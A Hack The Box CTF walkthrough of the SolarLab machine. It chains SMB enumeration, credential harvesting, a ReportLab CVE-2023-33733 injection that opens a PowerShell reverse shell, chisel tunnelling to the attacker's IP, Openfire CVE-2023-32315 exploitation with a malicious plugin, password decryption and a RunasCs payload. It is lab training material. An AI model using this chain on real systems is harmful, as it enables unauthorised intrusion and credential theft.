---
date: 2025-04-02
categories: [CTF, HTB]
title: "HTB - SolarLab"
tags: ['hashcat', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce']

description: "SolarLab - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - SolarLab

NMAP

![image1](../resources/498ef60f5e1c488aac1feb8188131a5b.png)

Add solarlab.htb and report.solarlab.htb to /etc/hosts

- **<u>Enumerate port 445:</u>**
```bash
enum4linux -u Guest -p "" -a solarlab.htb

```

![image2](../resources/e3a2eaac7c22484dabde9bb4c5723a74.png)

- Enum share:

![image3](../resources/132a7023ff524186b7932b89764f5942.png)

- Download the content and look for metadata:
```bash
exiftool concepts/* old_leave_request_form.docx details-file.xlsx  | grep "Modified" & exiftool concepts/* old_leave_request_form.docx details-file.xlsx | grep "Creator"

```

![image4](../resources/0cc386b1f81c46adbbaa78b7c6cc83ed.png)

- Opening the .docx file:

![image5](../resources/85b1fa037fe442ada28c34409ba15883.png)

| Alexander.knight@gmail.com | al;ksdhfewoiuh         |
|------------------------------------|------------------------|
| Kalexander                 | dkjafblkjadsfgl        |
| Alexander.knight@gmail.com | d398sadsknr390         |
| blake.byte                 | ThisCanB3typedeasily1@ |
| AlexanderK                 | danenacia9234n         |
| ClaudiaS                   | dadsfawe9dafkn         |

**<u>Enumerate port 6791:</u>**

- We get a login page:

![image6](../resources/ec8455b326bb4969af4a87dbf043c4f7.png)

- If we use **BlakeB** with the password **ThisCanB3typedeasily1@** , we can log in to report.solarlab.htb:6791

![image7](../resources/2b3eaa0fe1074152ae6dd5785e6800d5.png)

- All of these options are the same as below:

![image8](../resources/b756f09c75d5497988f04395ec9b8b12.png)


![image9](../resources/752fc97e7f024be8913038b21cb509ad.png)

- Generate a pdf
- Use exiftool to view the pdf:

![image10](../resources/11a4740779cd418c8fb7498cbfc9bc14.png)

- We can see that **ReportLab** is being used as the PDF Generator

- There is an exploit for ReportLab - **CVE-2023-33733**
<https://github.com/c53elyas/CVE-2023-33733>

**<u>Exploit steps:</u>**

- Open Burp
- Click on Leave Request
- Capture the request with Burp:

![image11](../resources/9cd7df414f6d4c2fa1401a48ccbcead1.png)

- What we need to **change** is the parameter **"leave_request"**

- On github there's a POC:
<https://github.com/c53elyas/CVE-2023-33733>

No need to git clone the repo

- If we scroll down to the bottom of the page:

![image12](../resources/b7017fdd553146abad33ba853b8364bb.png)

We can see the html code that needs to be injected in order to utilise the **os.system** command

- Now if we go over to revshells and get the powershell \#3 base64 code:

![image13](../resources/9cac1a668a864d2bbf8ade573e4ceadb.png)

- We can input that in the system() function instead


![image14](../resources/8408678b25644e31ac2d962e3e572846.png)

- Set up a listener
- Send the request

- And we get a shell as Blake:

![image15](../resources/d764af43f2f84da49edf1770cba4b934.png)


![image16](../resources/cec224e781f34f24b0df895804041936.png)

```bash
cat user.txt

```
- In the current app directory - we get the instance dir, which contains a db file:

![image17](../resources/203c3bb49b4240c29f980dacfe01a900.png)

alexanderk - HotP!fireguard'

claudias - 007poiuytrewq

blakeb - ThisCanB3typedeasily1@

- We can see a lot of ports running locally:

![image18](../resources/27a9627d920e420b9d72291a846a57d9.png)

<u>Upload chisel</u>

- On Kali:
```bash
./chisel server -p 8888 --reverse
```

- On target:
```bash
.\chisel.exe client 10.10.14.69:8888 R:socks &

proxychains nmap 127.0.0.1 -sT

```

![image19](../resources/1ee8bdc25db744b796457b60efa99f6d.png)

- OpenFire is running locally and Openfire admin console runs on port 9090:

![image20](../resources/edbd444421a44478844be28d7b9a6381.png)

- We get the Openfire version - **4.7.4** -- Which leads us to **CVE-2023-32315**

**<u>CVE-2023-32315</u>**

This exploit can be done manually:

<https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce>

**or**

Using a script:

```bash
git clone https://github.com/miko550/CVE-2023-32315.git

```
- **Since we don't have a valid user, do the following:**
```bash
cd CVE-2023-32315
pip3 install -r requirements.txt
proxychains python3 CVE-2023-32315.py -t http://127.0.0.1:9090

```

![image21](../resources/f94cb4e7f0dc47f8afbb1ef385fe4234.png)

- It created a user for us - by retrieving the csrf and jsessionid tokens and crafting a new user:
**username: lyy10y**

**password: llq47k**

- Login to the admin console with the new credentials

- Go to the Plugins page
- Upload the plugin (openfire-management-tool-plugin.jar ) found in the git repo

![image22](../resources/9fb5c42cec58472285a5e449ecf2a9e2.png)

- Successfully uploaded and the password is **123**

![image23](../resources/a878b324cfeb4e50b12615c86a44c329.png)
- Go to Server -\> Server Settings -\> Management Tool
(If you take too long, you need to reupload the plugin)


![image24](../resources/7ea490425bba4dd0b34cd794034724c2.png)

- And we're user Openfire:

![image25](../resources/ee33338a30ca4d81a1b0943fe14c379e.png)

- Using Powershell#3 from revshells and setting up a listener - we get a shell:

![image26](../resources/5a06ef3189164461a10b6902931cab36.png)


![image27](../resources/c6cb3a2fd55c412d8c94bff3c8d0e8e9.png)

- Upgrade to meterpreter:

![image28](../resources/3314d03bbd93423a8635de197df0121f.png)


![image29](../resources/6b16300ff7fc4ee2ba66abeceeaf39b4.png)

```bash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

```

![image30](../resources/24e11a20de6d41b4ad533cfee5f9fecb.png)

- In C:\Program Files\Openfire - we get an embedded-db folder and this contains some interesting files

- The **openfire.script** file is the "database" or more specifically it's a file with all the sql commands


![image31](../resources/8e09e64dc63e44a3b7802867b1a14bc0.png)

- In here we can see an encrypted password for Administrator and a passwordKey:

![image32](../resources/df3491a0f15a4f66b4185efd61b2bd6f.png)

- Luckily there is a repo for this:
<https://github.com/c0rdis/openfire_decrypt>

- Clone the repo

- Build the file:
```bash
javac OpenFireDecryptPass.java

```
- Enter the password and key:

![image33](../resources/66c61155a79e45b6a3e88b24d5d53ef2.png)

```bash
java OpenFireDecryptPass 'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442' 'hGXiFzsKaAeYLjn'

```

![image34](../resources/f55f2d23b51e4f70b7daf589fd629937.png)

We get: **ThisPasswordShouldDo!@**

- Use RunasCs to run a msf payload:
```bash
.\runascs.exe administrator ThisPasswordShouldDo!@ ".\rev.exe"

```

![image35](../resources/e24d32be38604f4bbf2ff154ca977c30.png)


![image36](../resources/b84c082cbd134de7afd6b2eed5ae2fb6.png)